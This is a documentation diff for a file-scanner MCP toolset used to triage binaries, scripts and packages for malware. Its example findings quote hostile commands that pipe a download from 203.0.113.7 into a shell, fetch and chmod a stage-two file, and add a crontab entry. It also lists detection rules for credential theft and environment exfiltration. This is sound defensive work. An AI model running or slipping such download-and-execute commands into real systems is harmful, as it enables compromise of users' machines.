@@ -225,8 +225,13 @@ Notes:
 
 1. **Overview.** Call `analyze_file` with only `file_path`. You get type, hashes, headline facts, the most telling
    strings and a `next_steps` list that names the next call. It never runs the heavy analyses. For a directory it
-   returns one triage row per file. Each `next_steps` entry has `tool`, `arguments` and `gives` (what the call
-   returns), and can be sent exactly as written.
+   returns one triage row per file. A `next_steps` entry is an object with `tool` and `arguments`, to be sent as
+   written, and a one-line explanation: `gives` (what the call returns) in the overview and in `disassemble`,
+   `compare_files`, `analyze_document`, `analyze_script` and `analyze_java_file`, `why` in section answers, in the
+   overview's steps to a specialist tool or to the `taint` section, and in the package tools. `inspect_archive`, `cache_status` and
+   `search_strings` give plain sentences instead. A step worded "if this is ..." is a guess about the file kind and
+   fails on a file of another kind. A `.war` or `.ear` is reported as kind `zip`, and its overview offers a
+   `disassemble` step that fails: call `analyze_java_file` on it.
 2. **One section.** Ask for a named section: `analyze_file` with `sections: ["symbols", "vulnerabilities"]`. Each
    section is computed in full, cached by the file's SHA-256 and returned as a short summary.
 3. **Read the items.** `query_analysis` pages and filters the lists inside a section (strings, imports,
@@ -256,16 +261,16 @@ Clients limit how much tool output they will inline: Claude Code warns above 10,
   A value above or below that range is clamped to it; a negative value is an error.
 - Anything that did not fit is named in the answer: a cut page carries a `hint` and `next_offset` (a cut
   `disassemble` listing carries a `note` and `next_address`); `analyze_file` section summaries (`sections` or
-  `all: true`) that were reduced to counts say so in `note`; a cut overview and some other answers (`analyze_file`
-  with `all: true`, `compare_files`, `llm_analyze_file`) list what was cut under `truncated`.
+  `all: true`) that were reduced to counts say so in `note`; `compare_files` and `llm_analyze_file` list what was
+  cut under `truncated`.
 - Lists come back in pages (see below), so a large list is never sent whole.
 
-Real sizes, in characters of the default answer (debug build, test programs from this repository):
+Real sizes, in characters of the default answer (test programs from this repository, section cache on):
 
 | Call | 22 KB ELF | 3.8 MB ELF | 8.3 MB ELF |
 | --- | --- | --- | --- |
-| `analyze_file` (overview) | 3,117 | 4,259 | 3,806 |
-| `analyze_file` with `all: true` | 25,567 | 30,983 | 33,495 |
+| `analyze_file` (overview) | 3,135 | 4,280 | 3,828 |
+| `analyze_file` with `all: true` | 26,473 | 32,036 | 34,614 |
 | `llm_analyze_file` | 2,627 | 5,257 | 4,570 |
 
 `hex_dump` and `strings` through `analyze_file` return summaries and short samples. To read the actual lists use
@@ -280,7 +285,8 @@ field names depend on the tool:
   `total`, `returned`, `offset` and `next_offset` at the top level. `next_offset` is absent on the last page.
   `analyze_file` on a directory does the same for its `files` table.
 - `analyze_document`, `analyze_script`, `inspect_archive` and `analyze_java_file` nest the four fields under the
-  list's name (`findings`, `entries`, `classes`, `resources` and so on) and put the summary beside it.
+  list's name (`findings`, `entries`, `classes`, `resources` and so on). The first three put the summary beside the
+  page; the paged views of `analyze_java_file` carry no summary (it is the `summary` view).
 - `yara_scan_file` pages matching files and calls the fields `matches_total`, `matches_returned`, `matches_offset`
   and `next_offset`.
 - A `disassemble` listing pages instructions, not rows: `returned`, `more`, `remaining` and `next_address`. Pass
@@ -307,7 +313,8 @@ If the byte budget cuts a page, `returned` and `next_offset` describe the rows a
 ### `cache: hit | miss`
 
 Most answers say where they came from. `hit` means a stored result was used; `miss` means the analysis ran now and
-was stored. `partial` (analysis sections) means some of the requested sections were stored and some were computed.
+was stored. `partial` means some of the requested sections were stored and some were computed, or, for
+`disassemble`, that code outside the stored window was decoded again.
 Under `--no-cache` nothing is stored and every call recomputes. Answers still carry `cache: "miss"`
 (`search_strings` with `file_path`: `miss_not_cached`); `analyze_file`, `query_analysis` and `disassemble` add a
 `cache_note` that says the section cache is off, the other tools do not. `cache_status` reports `enabled: false`.
@@ -331,10 +338,11 @@ the valid ones. Calling a tool that does not exist is a JSON-RPC `-32602` error.
 Absolute paths are recommended. A relative path is accepted and resolved against the server's working directory, which
 for a client-launched server is often not the directory you expect, so the same call can read a different file (or none)
 from one launch to the next. A leading `~/` is expanded. Symbolic links are resolved. FIFOs, sockets and device files
-are refused as a path. Inside a directory, such an entry is skipped and listed as skipped; it is never opened. Under
-`--allow-root` a symbolic link inside a directory that points outside the roots is not skipped: it refuses the whole
-directory call. With `--allow-root`, every path must resolve (symlinks and `..` included) to a place under one of the
-roots.
+are refused as a path. Inside a directory, such an entry is skipped and listed as skipped; it is never opened. In
+the `analyze_file` triage table, symbolic links are never followed or listed: they are counted under `links_skipped`,
+also under `--allow-root`. In a `yara_scan_file` directory scan, a link is listed under `skipped`, except that under
+`--allow-root` a link that points outside the roots refuses the call. With `--allow-root`, every path you name must
+resolve (symlinks and `..` included) to a place under one of the roots.
 
 ### Testing by hand
 
@@ -378,7 +386,7 @@ Start here. Triage overview of a file or directory.
 | Boolean flags | The same section names as flags (`symbols: true`) are accepted too. |
 | `min_string_length` | Shortest string to count (default 4, at most 4,096). |
 | `hex_dump`, `hex_dump_size`, `hex_dump_offset` | Default 256 bytes, at most 4,096; negative offset: from end. |
-| `arch` | Universal Mach-O slice, as `binary_info.universal_slices` names it, for per-slice sections. Unknown: error. |
+| `arch` | Universal Mach-O slice, as the overview's `type` names it (`x86_64`, `arm64e`). Unknown: error. |
 | `recursive`, `max_files` | Directory only: descend; most files listed (default 1,000, ceiling 10,000). |
 | `offset`, `limit` | Directory only: page of the triage table (limit at most 200). |
 
@@ -402,12 +410,16 @@ With no section named, the answer is the overview:
   "interesting_strings": [
     { "category": "IP Address", "value": "127.0.0.1", "offset": 12327 },
     { "category": "File Path", "value": "/proc/self/status", "offset": 12298 },
+    { "category": "Environment Variable", "value": "__FRAME_END__", "offset": 18684 },
     { "category": "Debug Info", "value": "ptrace", "offset": 2046 }, ...
   ],
-  "counts": { "strings": 189, "functions": 57, "imported_symbols": 35, "exported_symbols": 18 },
+  "counts": { "strings": 189, "unique_strings": 185, "functions": 57, "imported_symbols": 38, "exported_symbols": 18 },
   "available_sections": ["metadata", "hashes", "strings", ...],
   "not_applicable": { "taint": "applies to UTF-8 source or script text only, not to this kind of file" },
   "next_steps": [
+    { "tool": "analyze_file",
+      "arguments": { "file_path": "...", "sections": ["symbols", "threats"] },
+      "gives": "a summary of each named section (...); swap in any of available_sections; ..." },
     { "tool": "query_analysis",
       "arguments": { "file_path": "...", "section": "strings", "category": "IP Address" },
       "gives": "page and filter every string (filter, category, encoding, offset, limit)" }, ...
@@ -416,16 +428,31 @@ With no section named, the answer is the overview:
 }
 ```
 
+The overview adapts to the file. The first step names `["symbols", "threats"]` for a native binary and
+`["threats", "behavioral"]` for other files, except that a `.war` or `.ear` gets the native pair (`symbols` then
+comes back under `notes` as unsupported). `counts.imported_symbols` equals `format.imports_count`, and the imports
+step (`query_analysis`, section `binary_info`, list `imports`) is left out when there are none. A Java class file
+lists the native sections under `not_applicable` and gets no `disassemble` or imports step. A gzip stream that is not a
+tar gets no `inspect_archive` step. For a universal Mach-O, `type` lists the slices (`Mach-O universal binary
+(3 slices: x86_64, arm64e, arm64-subtype-12)`), `format.analyzed_slice` names the one that was read (the host's, else
+the first), and when that slice is not x86, `control_flow`, `vulnerabilities` and `code_quality` are listed under
+`not_applicable` with a reason that names `disassemble` and, if the file has an x86 slice, `arch: "x86_64"`.
+`arch` accepts a slice name as the overview prints it, or `ARM64E` and `ARM64 (subtype 12)` as `universal_slices`
+prints them. `arm64` and `aarch64` are accepted only when exactly one slice is ARM64-family; otherwise the error lists
+the slice names. The `next_steps` of section answers and of `disassemble` repeat the `arch` you passed.
+
 With sections or `all: true`, each section comes back as a summary (counts, headline numbers, a few top items) at the
 top level, plus `errors` (sections that failed), `notes` (sections that do not apply, with the reason), `next_steps`
-and `cache`. `all: true` on that file is 25,567 characters. For a directory the answer is `view: "directory"` with a
+and `cache`. `all: true` on that file is 26,473 characters. For a directory the answer is `view: "directory"` with a
 paged `files` table (path, size, type, kind, sha256, entropy, `flags`), `total`, `next_offset`, and
-`not_entered` when subdirectories were skipped.
+`not_entered` when subdirectories were skipped. Symbolic links are never followed or listed (`links_skipped` counts
+them), and a FIFO, socket or device is listed under `skipped`. The first `next_steps` entry names the first file of
+the page.
 
 Limits: a file over 256 MiB gets an overview without the whole-file sections (the answer says what was skipped and
 the call that runs it). A directory walk stops after 200,000 entries or 10 seconds. The overview names the specialist
 tool for the file's kind (`analyze_document`, `analyze_script`, `inspect_archive`, `analyze_java_file`,
-`analyze_npm_package`, `analyze_python_package`).
+`analyze_npm_package`, `analyze_python_package`), except that a `.war` or `.ear` is named only `inspect_archive`.
 
 ### query_analysis
 
@@ -436,7 +463,7 @@ Page and filter the lists inside one section of a file. Runs the section if it i
 | `file_path`*, `section`* | One of the sections above except `hashes`, `metadata`, `hex_dump`, `signatures`. |
 | `list` | List inside the section; default is its main list. The answer names `available_lists`. |
 | `filter` | Case-insensitive substring; with `regex: true`, a regular expression. |
-| `category` | Strings: `URL`, `IP Address`, `Email`, ... Vulnerabilities: category or severity. |
+| `category` | Strings: `URL`, `IP Address`, ... Vulnerabilities: category or severity. Threats: `metadata.category`. |
 | `encoding` | Strings only: `ascii`, `utf16le` or `utf16be`. |
 | `min_string_length` | Strings only (default 4, at most 4,096). |
 | `detail` | Return raw rows instead of compact ones. |
@@ -461,9 +488,12 @@ unreachable_functions); `taint` (flows, vulnerabilities, sources, sinks, sanitiz
 ```
 
 `unfiltered_total` is the size of the stored list before the filter. For a file with more strings than the
-stored list holds (50,000 plain and 50,000 categorized), an unfiltered page says so (`strings_in_file` and a `note`);
-a `filter`, `category` or `encoding` scans the whole file again for the matches, and `unfiltered_total` then equals
-`total`, not the size of the list.
+stored list holds, an unfiltered page says so (`strings_in_file` and a `note`; `unfiltered_total` is then the size of
+the stored list). A `filter`, `category` or `encoding` scans the whole file again for the matches, and
+`unfiltered_total` and `strings_in_file` then equal the file's string count. A `category` that no row has gives
+`total: 0` and a `note` that lists the categories of the file with their counts (`Categories in this file: ...`); for
+`threats` it lists the values of `metadata.category`. Pages of `control_flow`, `call_graph`, `code_quality` and
+`disassembly` repeat the section's limit notes, with the kept and real counts, in `note`.
 
 ### disassemble
 
@@ -473,9 +503,9 @@ Machine code of one function or address range, as a text listing. Never the whol
 | Argument | Notes |
 | --- | --- |
 | `file_path`* | Absolute path. |
-| `function` | A symbol or function-list name (exact, else a unique case-insensitive match), or an address. |
+| `function` | A function-list or symbol-table name (exact, else a unique case-insensitive substring), or an address. |
 | `address` | `"0x401136"` or a number: the function containing it is listed from there. |
-| `arch` | Universal Mach-O slice. Unknown: error. |
+| `arch` | Universal Mach-O slice, as for `analyze_file`. Unknown: error. |
 | `max_instructions` | Default 200, at most 1,000. |
 | `filter`, `offset`, `limit` | With neither `function` nor `address`: page through the function list. |
 
@@ -489,9 +519,16 @@ With neither `function` nor `address` it lists functions:
     { "name": "deregister_tm_clones", "address": "0x1490", "size": 48, "instructions": 11, "complexity": 3 }, ...
   ],
   "total": 20, "returned": 3, "offset": 0, "next_offset": 3,
-  "architecture": "x86_64", "total_instructions": 773, "decoded_range": "0x1460..0x20c9", "cache": "hit"
+  "architecture": "x86_64", "total_instructions": 773, "decoded_range": "0x1460..0x20c9",
+  "next_steps": [ { "tool": "disassemble", "arguments": { "file_path": "...", "function": "_start" },
+                    "gives": "the instruction listing of that function (any name from items works; ...)" } ],
+  "cache": "hit"
 }
 ```
+
+The first `next_steps` entry names the first function on the page. A file with more than 5,000 function symbols lists
+the first 5,000 and says so in `note`; `filter` also searches the others (their rows carry `listed_from` and no
+`instructions` or `complexity`), and the note gives the kept and real counts.
 
 With `function: "main", max_instructions: 5`:
 
@@ -506,9 +543,14 @@ With `function: "main", max_instructions: 5`:
 
 Limits: `disassemble` works on an ELF, a thin Mach-O, or one slice of a universal Mach-O. Pick the slice with
 `arch`. A bounded part of the disassembly (the first 20,000 instructions) is cached; code outside it is decoded
-again on every call, which takes about a second on a large file, and the answer says so in `window_note`. A function
-is found by any name the `symbols` section lists, also on a file with more than 5,000 functions; an imported name
-has no code to list and is refused. When the function list is capped, the answer says so.
+again on every call, which takes about a second on a large file. The answer says so in `window_note` and carries
+`cache: "partial"`. A function is found by any function name in the symbol table, also on a file with more than 5,000
+functions: its listing is the symbol's range and `function.listed_from` says it came from the symbol table. An
+imported name has no code to list and is refused, and so is a substring that matches more than one function (the
+error lists them). A name that no function has is an error that also says the symbol table has none. Following
+`next_address` of such a listing continues past the symbol's end, because an address lists from that instruction on.
+`total_instructions` counts decoded instructions. A listing of a range also counts `.byte` rows for bytes that could
+not be decoded, so the two can differ by that count (3,767 against 3,881 on the x86_64 slice of `/bin/ls`).
 
 ### read_hex
 
@@ -582,7 +624,7 @@ With `file_path` the answer is `scope: "file"` and lists each match with its off
 ```
 
 Without it, `scope: "session"`: each item has `total_occurrences`, `files_total` and up to 5 `files`. Strings are
-indexed by `analyze_file` with strings and by this tool; files you have not touched are not searched.
+indexed by `analyze_file` and by this tool; files you have not touched are not searched.
 Limits: indexing a file stops at 200,000 strings or 32 MiB of text, and says so.
 
 ### string_details
@@ -597,16 +639,17 @@ Everything known about one exact string: files, offsets, categories, entropy and
 
 ```json
 {
-  "value": "Debugger detected!", "total_occurrences": 3, "files_total": 3,
+  "value": "Debugger detected!", "total_occurrences": 1, "files_total": 1,
   "files": [ { "file_path": "/samples/test_programs/c_advanced_binary", "file_hash": "91f09b...",
-               "occurrences": 1, "offsets": [12682] }, ... ],
+               "occurrences": 1, "offsets": [12682] } ],
   "categories": ["file_string", "generic"], "entropy": 3.19, "suspicious": false,
   "related": [ { "value": "__GNU_EH_FRAME_HDR", "score": 0.75 }, ... ]
 }
 ```
 
-Strings indexed by `analyze_file` carry their offsets too. A value that was never tracked is an error that says
-how to get it tracked.
+Strings indexed by `analyze_file` carry their offsets too. A string the index does not hold (shorter than 4
+characters, or past the index's scan or count limits) has no offsets, and the file row carries an `offsets_note`. A
+value that was never tracked is an error that says how to get it tracked.
 
 ### llm_analyze_file
 
@@ -628,7 +671,7 @@ YARA rule or one answer that fits a small context; use `analyze_file` to investi
   "file_type": "ELF 64-bit shared object or PIE executable (x86-64)", "architecture": "x86_64", "is_packed": false,
   "key_strings": ["127.0.0.1", "/proc/self/status", "TracerPid:", "Debugger detected!", "msftupdater.com", ...],
   "hex_patterns": ["7F 45 4C 46 02 01 01 00 ...", ...],
-  "imports": ["getenv", "strcpy", "ptrace", "connect", ...],
+  "imports": ["getenv", "free", "strcpy", "ptrace", "connect", ...],
   "opcodes": ["F3 0F 1E FA", "31 ED", ...],
   "entropy": 3.37,
   "yara_rule_suggestion": "rule c_advanced_binary { ... condition: filesize == 22088 and 3 of ($s*) and $header at 0 }"
@@ -636,8 +679,10 @@ YARA rule or one answer that fits a small context; use `analyze_file` to investi
 ```
 
 The draft rule is a starting point. It is tied to this one file (note the `filesize` condition); edit it before you
-use it on other samples. If the digest does not fit `token_limit`, what was cut is listed under `truncated`. If no
-rule could be built, `yara_rule_note` says why.
+use it on other samples. If the digest does not fit, what was cut is listed under `truncated`, and `truncated.how`
+names the limit that was hit: `max_output_bytes` (with its maximum) or `token_limit`. Opcodes come from the entry
+point of an ELF or PE file; for a Mach-O, `notes` says `opcodes: none, entry-point opcodes are supported for ELF and
+PE files`. If no rule could be built, `yara_rule_note` says why.
 
 ### yara_scan_file
 
@@ -651,10 +696,10 @@ Scan a file or directory with YARA rules (YARA-X).
 | `recursive` | Default true. |
 | `max_file_size` | Bytes; default and ceiling 100 MB. Larger files are listed under `skipped`. |
 | `detailed_matches` | List matched strings (default true). |
-| `max_matches_per_rule` | Default 10, at most 1,000. `strings_total` has the full count. |
-| `max_rules_per_file` | Default 100, at most 1,000. |
-| `max_files` | Default 10,000, at most 100,000. |
-| `timeout_seconds` | Default 60, at most 600. |
+| `max_matches_per_rule` | 1 to 1,000, default 10. `strings_total` has the full count. |
+| `max_rules_per_file` | 1 to 1,000, default 100. |
+| `max_files` | 1 to 100,000, default 10,000. |
+| `timeout_seconds` | 1 to 600, default 60. Covers the walk under `path` and the scan, not loading `rule_path`. |
 | `offset`, `limit` | Page of matching files (default 50). |
 
 One of `yara_rule` and `rule_path` is required. A call without `offset` always scans anew; later pages are served
@@ -683,7 +728,10 @@ Failed to compile YARA rule (yara_rule): error[E025]: unknown pattern `$b`
  --> yara_rule:1:41
 ```
 
-Limits: whatever was cut is named under `limits_reached`. Under `--allow-root` the server checks each entry under
+Limits: whatever was cut is named under `limits_reached`. When many files were skipped, one message says `skipped
+names the first N of M files` and `skipped_total` has the count. A symbolic link to a directory that you give as
+`path` is scanned and not listed under `skipped`; a link inside the tree is listed there as not followed, and a FIFO,
+socket or device is skipped without being opened. Under `--allow-root` the server checks each entry under
 `path` as the walk reaches it, inside `max_files` and `timeout_seconds`, not the whole tree first. A symbolic link
 that leaves the roots refuses the call when the walk reaches it, so a call with a small `max_files` may succeed on
 a tree where a full scan is refused. `rule_path` is different: it is checked whole before the scan. A rule file
@@ -715,17 +763,18 @@ PDF categories: `action`, `script`, `link`, `launch`, `submit`, `attachment`, `e
     "next_steps": [ { "tool": "analyze_document", "arguments": { "file_path": "...", "category": "script" },
                       "gives": "the JavaScript" }, ... ]
   },
-  "findings": { "items": [ { "category": "action", "name": "JS", "severity": "high", "count": 1,
-                             "evidence": [ { "offset": 203, "object": 4, "in_stream": false } ] }, ... ],
-                "total": 4, "returned": 2, "offset": 0, "next_offset": 2 }
+  "findings": { "items": [ { "category": "script", "severity": "high", "offset": 206, "object": 4, "length": 13,
+                             "preview": "app.alert(1);", "suspicious_patterns": [] } ],
+                "total": 1, "returned": 1, "offset": 0 }
 }
 ```
 
 Office files report whether a VBA project exists, its modules, auto-execute entry points and suspicious keywords with
 module and line. Limits: module count, bytes read and decompressed, and keyword hits are capped, and the summary says
-so; a file that could not be read in full, such as an encrypted one or a PDF with no readable body, is never rated
-low. A file that is neither PDF nor Office gives an error
-that names the right tool.
+so; a file that could not be read in full is never rated low: an encrypted PDF is rated at least medium, and so is
+a PDF in which no object could be read (reason `Nothing could be read`). Up to 5,000 link targets (category `link`)
+are listed; launch and submit targets are capped at 200, and the summary `notes` say when the rest cannot be
+retrieved. A file that is neither PDF nor Office gives an error that names the right tool.
 
 ### analyze_script
 
@@ -737,6 +786,7 @@ One script file: shell, PowerShell, JavaScript, Python, batch or VBScript.
 | `language` | Force `shell`, `powershell`, `javascript`, `python`, `batch` or `vbscript`. Default: detect. |
 | `category` | One finding category (listed below the table). |
 | `min_severity` | `low`, `medium`, `high` or `critical`. |
+| `line_from`, `line_to` | Scan this range of lines (1-based, inclusive) again; not cached. |
 | `offset`, `limit` | Page of findings (default 0 and 50, at most 500). |
 | `max_output_bytes` | Byte budget of the answer, as for every tool. |
 
@@ -747,17 +797,20 @@ Categories: `download_execute`, `dynamic_execution`, `encoded_payload`, `persist
 {
   "cache": "miss",
   "summary": { "language": "Shell", "line_count": 4, "detected_by": "shebang",
-               "risk": { "level": "high", "score": 40 }, "findings_total": 2,
+               "risk": { "level": "high", "score": 55 }, "findings_total": 2,
                "category_counts": { "download_execute": 1, "persistence": 1 } },
   "findings": { "items": [
-    { "category": "download_execute", "rule": "download_then_run", "severity": "high", "line": 3,
-      "matched": "curl -fsSL http://203.0.113.7/stage2 -o /tmp/.u && chmod +x",
-      "description": "downloads a file and then makes it executable or runs it" },
+    { "category": "download_execute", "rule": "curl_pipe_shell", "severity": "critical", "line": 3,
+      "matched": "curl -s http://203.0.113.7/payload.sh | sh",
+      "description": "downloads a script and pipes it straight into a shell" },
     { "category": "persistence", "rule": "cron", "severity": "high", "line": 4, "matched": "crontab", ... } ],
     "total": 2, "returned": 2, "offset": 0 }
 }
 ```
 
+A whole-file scan keeps 2,000 findings. When there are more, `summary.notes` says so and names the line the kept
+findings reach; call again with `line_from` and `line_to` to scan a range and reach the rest (the answer then has a
+`range` object, and the score and counts stay those of the whole file). A `line_from` after `line_to` is an error.
 An unknown language, category or severity, binary input, or an undetectable language is an error. For a package
 use the package tools; for a binary use `analyze_file`.
 
@@ -792,12 +845,15 @@ List the entries of an archive without extracting it: `.zip` (and `.jar`, `.apk`
 ```
 
 Entry risk flags: path traversal, links leaving the extraction root, device nodes, setuid bits, executables, double
-extensions. These are what `risky_only` selects. A possible compression bomb is different: it is reported only in the
-summary (`possible_bomb: true`, with the sizes and ratio). No entry gets an indicator for it and `risky_only` does not
-return one. The listing is cached by SHA-256, so paging does not parse the archive again. Limits: encrypted or
-compressed RAR and 7z headers cannot be listed; `.tar.bz2` and `.tar.xz` are recognized but not listed. When a listing
-is unavailable, partial or capped, `entries` and `uncompressed_bytes` in the summary are `null` and the risk is
-`unknown`, not `low`. An encrypted archive is never rated low.
+extensions, and a possible compression bomb (`CompressionBomb`, high; the summary also has `possible_bomb: true` with
+the sizes and ratio). These are what `risky_only` selects. The listing is cached by SHA-256, so paging does not parse
+the archive again. Limits: encrypted or compressed RAR and 7z headers cannot be listed; `.tar.bz2` and `.tar.xz` are
+recognized but not listed. When a listing is unavailable, partial or capped, `entries`, `uncompressed_bytes` and
+`compression_ratio` in the summary are `null` (always present) and the risk is `unknown`, not `low`; the
+`analyze_file` overview of an archive leaves those keys out instead. Password-protected entries are not opened: a note
+says how many, the risk is `medium` when some entries are encrypted and `unknown` when all are. Nested archives are
+listed in a note (up to 5 names) and not opened; a risk that would be `low` becomes `unknown`, and a next step says to
+extract and inspect them.
 
 ### analyze_java_file
 
@@ -807,13 +863,13 @@ A Java archive (JAR, WAR, EAR, AAR, APK) or a class file, decided from the conte
 | --- | --- |
 | `file_path`* | Absolute path. |
 | `view` | `summary` (default), `classes`, `findings`, `resources`, `class`, `manifest`, `android`, `nested`. |
-| `class` | Class name for `view: "class"` (dots or slashes). |
+| `class` | Class name for `view: "class"` (dots or slashes), or `<container>!<class>` as `example_classes` gives it. |
 | `filter` | Substring: class, container or API; path; attribute; kind or name; archive path. |
 
 ```json
 {
   "view": "summary", "archive_type": "Jar",
-  "counts": { "entries": 2, "classes": 1, "resources": 2, "nested_archives": 0, "dex_files": 0 },
+  "counts": { "entries": 3, "classes": 1, "resources": 3, "nested_archives": 0, "dex_files": 0, ... },
   "java_versions": { "Java 8 (major 52)": 1 },
   "manifest": { "main_class": "app.Loader", "class_path": [], ... },
   "signing": { "status": "no signature files found", "files": [] },
@@ -824,17 +880,24 @@ A Java archive (JAR, WAR, EAR, AAR, APK) or a class file, decided from the conte
     "top_findings": [
       { "category": "process_exec", "api": "java.lang.Runtime.exec", "severity": "High", "classes": 1,
         "example_classes": ["app.Loader"] }, ... ] },
-  "next_steps": [ { "tool": "analyze_java_file", "arguments": { "file_path": "...", "view": "findings" } }, ... ],
+  "next_steps": [ { "tool": "analyze_java_file", "arguments": { "file_path": "...", "view": "findings" },
+                    "gives": "every dangerous API with class counts and example classes" }, ... ],
   "cache": "miss"
 }
 ```
 
 Dangerous APIs (process execution, reflection, class and native loading, network, crypto, deserialization, JNDI,
-scripting, `Unsafe`) are read from the class constant pool. Nested archives are opened up to two levels deep (an
-EAR's WAR's libraries) within byte caps; a third level is reported as not opened. They are named by their full path,
-for example `a.war!WEB-INF/lib/util.jar`. `cache_clear` and `--no-cache` apply to this tool as to every other.
-Not done: signatures are listed as "present, not verified"; `classes.dex` is not parsed, so APK code is not
-assessed; there is no vulnerable-library (CVE) check.
+scripting, `Unsafe`) are read from the class constant pool. `view: "findings"` carries `threat_basis` beside
+`threat_level`. Nested archives are opened up to two levels deep (an EAR's WAR's libraries) within byte caps; a third
+level is reported as not opened. They are named by their full path from the analyzed file, joined with `!`, for example
+`a.war!WEB-INF/lib/util.jar`; the nested rows, a class's `container`, `also_in` and the `example_classes` of a finding
+(`web.war!WEB-INF/lib/x.jar!pkg.Cls`) use that form, and `filter` matches the outer archive too. In `view: "class"`,
+a bare class name picks the first copy and lists the others in `also_in`; `<container>!<class>`, with the container
+exactly as printed (slashes included), picks one copy, and a miss names the container and lists close matches with
+their containers. `cache_clear` and `--no-cache` apply to this tool as to every other. Not done: signatures are
+listed as "present, not verified"; `classes.dex` is not parsed, so APK code is not assessed (an archive with DEX
+files is rated at least Medium, with the basis `<n> DEX file(s) hold Dalvik code that is not parsed`); there is no
+vulnerable-library (CVE) check.
 
 ### analyze_npm_package
 
@@ -853,20 +916,24 @@ Vet a local npm package. The tool is offline: it never downloads anything.
   "package": { "name": "left-pad-utils", "version": "1.0.3" },
   "input": { "kind": "tarball", "manifest": "package/package.json", "files_total": 2, "files_scanned": 1, ... },
   "risk": { "level": "Critical", "score": 100.0,
-            "reasons": ["an install-time script runs suspicious code: Download piped to a shell or interpreter ...",
+            "reasons": ["1 known-malicious pattern(s): Suspicious network activity",
+                        "an install-time script runs suspicious code: Download piped to a shell or interpreter ...",
                         "1 known vulnerability(ies) in dependencies (0 critical, 1 high)", ...] },
   "findings": { "total": 4, "by_severity": { "critical": 1, "high": 2, "medium": 1, "low": 0 },
     "top": [
       { "rule": "Download piped to a shell or interpreter", "severity": "Critical",
         "file": "package/package.json#scripts.postinstall", "line": 1,
         "evidence": "curl -s http://203.0.113.7/p.sh | sh" },
+      { "rule": "Private key or cloud credential file", "severity": "High", "file": "package/index.js", ... },
       { "rule": "Eval of decoded payload", "severity": "High", "file": "package/index.js", "line": 3, ... }, ... ] },
   "install_scripts": { "has_postinstall_script": true, "hooks": ["postinstall"], "dangerous_commands": 1 },
   "dependencies": { "direct": 1, "with_advisories": 1, "vulnerable": ["lodash"], ... },
   "advisory_data": { "source": "small built-in table compiled into file-scanner; nothing is fetched",
                      "last_updated": "2025-01-06", "newest_advisory": "2022-03-16", "package_count": 6,
                      "offline": true, "coverage_note": "An empty vulnerability list means ... not in this table ..." },
-  "next_steps": [ ... ], "cache": "miss"
+  "next_steps": [ { "tool": "analyze_npm_package", "arguments": { "package_path": "...", "section": "findings" },
+                    "why": "source findings with file, line and evidence, worst first" }, ... ],
+  "cache": "miss"
 }
 ```
 
@@ -877,6 +944,24 @@ Limits: up to 400 source files, 1 MiB each and 16 MiB in all, are scanned (`.js 
 was not read in full is never rated safe. The advisory data is a small offline table (6 packages, newest advisory
 2022). An empty vulnerability list does not mean the package is clean.
 
+What raises the rating, in both package tools:
+
+- A download that is written to disk and run, a download passed to code evaluation, a credential file sent over the
+  network, or the whole environment sent over the network is a High source finding. The statements must lie within 60
+  lines of each other (8 for the environment), in order; lines over 1,000 characters are not judged by these checks.
+- A file named by an install hook (`preinstall`, `install`, `postinstall`, `prepare`, `prepublish`) is install-time
+  code. Its High findings appear in `install_scripts.dangerous_commands` and in a risk reason such as `an install-time
+  script runs suspicious code: ... (preinstall runs scripts/setup.js)`. The runner is read from the command
+  (`node`, `sh`, `python`, or a direct `./path`); a file reached only through `require()`, or a runner such as `npx`,
+  is not followed.
+- A dependency (direct, lock-pinned or transitive) on a release the built-in table marks as malicious rates at least
+  High (reason `depends on N known malicious release(s): ...`, listing `name@version` in the npm tool and the name
+  alone in the Python tool); `dependencies.known_malicious_releases` lists them and the rows in the `dependencies`
+  section are marked `known_malicious_release: true`.
+- A suspected typosquat (`typosquatting.suspected`) rates at least Medium.
+- A tarball, sdist or zip with an entry that has `..`, an absolute path or a link is rated at least High: one finding
+  per entry (category `unsafe-path`) and a note that begins `UNSAFE ARCHIVE ENTRIES`.
+
 ### analyze_python_package
 
 The same tool for Python, with the same arguments and answer shape.
@@ -886,7 +971,9 @@ The same tool for Python, with the same arguments and answer shape.
 | `package_path`* | `.whl`, `.tar.gz`, `.zip`, a directory, `setup.py`, `pyproject.toml`, `requirements.txt`. |
 | `section`, `query`, `min_severity`, `only_flagged` | As for `analyze_npm_package`. |
 
-A `poetry.lock` file is accepted as a dependency list.
+A `poetry.lock` file is accepted as a dependency list. For a requirements file, a lock file or a wheel,
+`section: "scripts"` has no `setup_type` and a note says there is no setup script; `suspicious_imports` lists
+modules only, and the rule names are under `dangerous_operations`.
 `setup.py` is checked for install-time behaviour. A PyPI name such as `requests==2.5.0` is an error: run
 `pip download` and pass the file. Version matching follows PEP 440 with normalized names; an unpinned requirement is
 unknown, not vulnerable. Limits: up to 400 source files, 1 MiB each and 16 MiB in all (the same extensions as for the
@@ -922,7 +1009,9 @@ for confirmation.
 
 It deletes only files the cache wrote. The answer lists what was cleared: `{"cleared": ["tracked strings"]}` for scope
 `strings`; the default scope returns
-`["analysis history, cached sections and files on disk", "tracked strings"]`. Later calls recompute.
+`["analysis history, cached sections and files on disk", "tracked strings"]`. Later calls recompute. The `analysis`
+scope also drops the results `analyze_java_file` keeps in memory. Under `--no-cache` the list says that nothing was
+on disk and that the in-memory string index was emptied.
 
 ## Worked examples
 
@@ -1007,7 +1096,8 @@ Then call the tool:
 ```
 
 The summary rates the package Critical: a `postinstall` script pipes a download into a shell, `index.js` evaluates a
-decoded payload and reads `~/.ssh/id_rsa`, and the pinned `lodash` 4.17.4 has an advisory. Page the evidence:
+decoded payload and reads `~/.ssh/id_rsa`, and the pinned `lodash` 4.17.4 has an advisory. Page the evidence; this
+call returns the Critical finding and the two High ones:
 
 ```json
 { "name": "analyze_npm_package", "arguments": { "package_path": "/tmp/demo/left-pad-utils-1.0.3.tgz",
@@ -1119,7 +1209,7 @@ It reports a download-and-run on line 3 and a cron entry on line 4. If you are n
 
 | Command | Transport |
 | --- | --- |
-| `file-scanner mcp-stdio` | JSON-RPC over stdin and stdout, one JSON object per line. |
+| `file-scanner mcp-stdio` | JSON-RPC over stdin and stdout, one JSON object per line. Exits 0 when stdin closes. |
 | `file-scanner mcp-http` | Streamable HTTP at `/mcp`, plus REST helper routes. |
 | `file-scanner mcp-sse` | Deprecated alias of `mcp-http`: prints a notice, starts the same server. Use `/mcp`. |
 
@@ -1236,7 +1326,7 @@ protocol; they are for scripts and health checks.
 | Route | Use |
 | --- | --- |
